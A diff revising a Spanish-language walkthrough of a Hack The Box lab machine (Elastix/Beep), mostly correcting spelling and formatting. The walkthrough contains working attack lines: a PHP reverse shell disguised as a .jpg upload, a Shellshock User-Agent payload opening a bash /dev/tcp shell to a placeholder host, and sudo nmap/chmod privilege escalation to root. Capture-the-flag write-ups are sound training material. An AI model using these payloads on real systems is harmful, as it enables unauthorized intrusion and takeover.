@@ -7,7 +7,7 @@ coverY: 0
 
 ## Reconocimiento
 
-Empezamos comprovando que tengamos conexion con la maquina enviando un traza con el protocolo **ICMP**
+Empezamos comprobando que tengamos conexion con la maquina enviando un traza con el protocolo **ICMP**
 
 ```shell
 > ping -c 1 10.10.10.7
@@ -22,7 +22,7 @@ rtt min/avg/max/mdev = 59.943/59.943/59.943/0.000 ms
 Vemos que nos responde entonces vamos a escanear todo el rango de puertos que tenga abiertos la maquina
 
 ```shell
-nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.7 -oG allPorts
+> nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.7
 
 PORT      STATE SERVICE          REASON
 22/tcp    open  ssh              syn-ack ttl 63
@@ -43,7 +43,7 @@ PORT      STATE SERVICE          REASON
 10000/tcp open  snet-sensor-mgmt syn-ack ttl 63
 ```
 
-Y con esos puertos vamos a scripts basicos de reconocimiento y escanear versiones
+Y con esos puertos vamos a scripts básicos de reconocimiento y escanear versiones
 
 ```shell
 nmap -sCV -p22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000 10.10.10.7 
@@ -98,7 +98,7 @@ Host script results:
 
 ### Puerto 80 (https)
 
-Vamos a usar **whatweb** que actua como el **wappalayzer** para enumerar que tecnologias usa por detras versiones etc..
+Vamos a usar **whatweb** que actúa como el **wappalayzer** para enumerar que tecnologías usa por detrás versiones etc..
 
 ```shell
 > whatweb http://10.10.10.7
@@ -108,19 +108,19 @@ ERROR Opening: https://10.10.10.7/ - SSL_connect returned=1 errno=0 state=error:
 ERROR Opening: https://10.10.10.7 - SSL_connect returned=1 errno=0 state=error: dh key too small
 ```
 
-Si sale este error
+* Si sale este error
 
 <figure><img src="../../../.gitbook/assets/errortls.PNG" alt=""><figcaption></figcaption></figure>
 
-Le das al boton de la derecha donde esta **security.tls.version.enable-deprecated** --> **True**
+En `about:config` Le das al botón de la derecha donde esta **security.tls.version.enable-deprecated** --> **True**
 
 <figure><img src="../../../.gitbook/assets/tls_error.PNG" alt=""><figcaption></figcaption></figure>
 
-Ya funcionaria
+* Ya funcionaria
 
 <figure><img src="../../../.gitbook/assets/Puerto80.PNG" alt=""><figcaption></figcaption></figure>
 
-#### Explotacion
+#### Explotación
 
 Buscamos con **searchsploit** vulnerabilidades que tenga `elastix` y vamos a probar el del **local file inclusion** que significa leer archivos de la maquina
 
@@ -139,7 +139,7 @@ FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                    | php/
 -------------------------------------------------------------------------- ---------------------------------
 ```
 
-Segun el script de perl hay una ruta donde se puede hacer el **local file inclusion**
+Según el script de perl hay una ruta donde se puede hacer el **local file inclusion**
 
 ```perl
 > searchsploit -x php/webapps/37637.pl | grep "LFI Exploit"
@@ -157,18 +157,18 @@ Contraseña: **jEhdIekWmdjE**
 
 <figure><img src="../../../.gitbook/assets/login_crm.PNG" alt=""><figcaption></figcaption></figure>
 
-Y estamos dentro ahora lo que falta es como a partir de aqui conseguir ejecucion remota de comandos
+Y estamos dentro ahora lo que falta es como a partir de aquí conseguir ejecucion remota de comandos
 
 * Vamos a settings --> Communication Templates --> Company Details
 
 <figure><img src="../../../.gitbook/assets/settings.PNG" alt=""><figcaption></figcaption></figure>
 
-Vemos que hay una imagen y parece que podemos subir archivos .jpg con eso podemos aprovercharnos para subir un archivo que nos envie una reverse shell
+Vemos que hay una imagen y parece que podemos subir archivos .jpg con eso podemos aprovecharnos para subir un archivo que nos envie una reverse shell
 
-* Creamos un archivo rs.php.jpg para enviarnos una reverse shell
+* Creamos un archivo **rs.php.jpg** para enviarnos una reverse shell
 
 ```php
-<?php system("bash -c 'bash -i >& /dev/tcp/<tu-ip>/<puerto> 0>&1'") ?>
+<?php system("bash -c 'bash -i >& /dev/tcp/<tu-ip>/<tu-puerto> 0>&1'") ?>
 ```
 
 * Nos ponemos en escucha con netcat por el puerto indicado
@@ -177,7 +177,7 @@ Vemos que hay una imagen y parece que podemos subir archivos .jpg con eso podemo
 > nc -lvnp <puerto>
 ```
 
-* Lo subimos y le damos a save
+* Lo subimos y le damos a **save**
 
 <figure><img src="../../../.gitbook/assets/file_upload.PNG" alt=""><figcaption></figcaption></figure>
 
@@ -220,7 +220,7 @@ User asterisk may run the following commands on this host:
 
 Cuando hacemos sudo -l vemos que podemos ejecutar varios binarios como root y vemos que podemos ejecutar **nmap**, **chmod** entre otros como **root** sin contraseña entonces ya estaría echo podemos hacerlo desde **nmap** o con **chmod** vamos a ver las dos
 
-* nmap
+* escalar privigelios con nmap
 
 ```shell
 bash-3.2$ whoami 
@@ -234,7 +234,7 @@ bash-3.2# whoami
 root
 ```
 
-* chmod
+* escalar privigelios con chmod
 
 ```shell
 bash-3.2$ sudo chmod +s /bin/bash # Asignamos el permiso suid a las bash
@@ -247,7 +247,7 @@ root
 
 ### Puerto 10000 (https)
 
-Vamos a usar **whatweb** que actua como el **wappalayzer** para enumerar que tecnologias usa por detras versiones etc..
+Vamos a usar **whatweb** que actúa como el **wappalayzer** para enumerar que tecnologias usa por detrás versiones etc..
 
 ```shell
 > whatweb https://10.10.10.7:10000
@@ -262,13 +262,13 @@ Vemos que en la url vemos que es un archivo .cgi, como la maquina es bastante vi
 
 Shellshock es una vulnerabilidad asociada al `CVE-2014-6271` que salió el 24 de septiembre de 2014 y afecta a la shell de Linux “Bash” hasta la versión 4.3. Esta vulnerabilidad permite una ejecución arbitraria de comandos.
 
-### Explotacion
+### Explotación Shellshock
 
 * Habilitamos el foxyproxy
 
 <figure><img src="../../../.gitbook/assets/foxyproxy.PNG" alt=""><figcaption></figcaption></figure>
 
-* Interceptamos la peticion con burpsuite dandole al enter en la url
+* Interceptamos la petición con burpsuite dandole al enter en la url
 
 <div>
 
@@ -280,23 +280,23 @@ Shellshock es una vulnerabilidad asociada al `CVE-2014-6271` que salió el 24 de
 
 </div>
 
-* Nos ponemos en escucha con netcat para recivir la reverse shell
+* Nos ponemos en escucha con netcat para recibir la reverse shell
 
 ```shell
 > nc -lvnp <puerto>
 ```
 
-* Lo mandamos al repeater con control + R y en el User-Agent ponemos lo siguiente para enviarnos una reverse shell
+* Mandamos la petición al repeater con control + R y en el User-Agent ponemos lo siguiente para enviarnos una reverse shell
 
 ```shell
 User-Agent: () { :; }; bash -i >& /dev/tcp/<tu-ip>/<puerto> 0>&1
 ```
 
-* Le damos a enviar
+* Le damos a **send** para enviar la **reverse shell**
 
 <figure><img src="../../../.gitbook/assets/shellshockBurp.PNG" alt=""><figcaption></figcaption></figure>
 
-* Recibimos la `reverse shell` y estariamos dentro como **root**
+* Recibimos la **reverse shell** y estaríamos dentro como **root**
 
 ```shell
 > nc -lvnp 4444
